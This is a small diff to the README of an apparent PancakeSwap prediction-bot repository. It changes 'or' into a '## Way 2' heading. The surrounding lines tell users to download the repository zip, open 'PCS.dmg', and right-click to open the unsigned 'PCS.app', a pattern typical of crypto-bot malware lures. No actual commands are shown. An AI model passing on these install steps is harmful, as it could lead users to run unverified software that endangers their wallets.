@@ -80,7 +80,7 @@ cd pancake-predict-bot-UI-Supported
 - Download [This Repo](https://github.com/SilviaKadeh/pancake-predict-bot-UI-Supported/archive/refs/heads/main.zip) the repository release and extract files. 
 - Double-Click on the "PCS.dmg" -> Right-click on the "PCS.app" and click open to run it.
 
-or
+## Way 2
   
 Then run the following commands in Terminal:
 
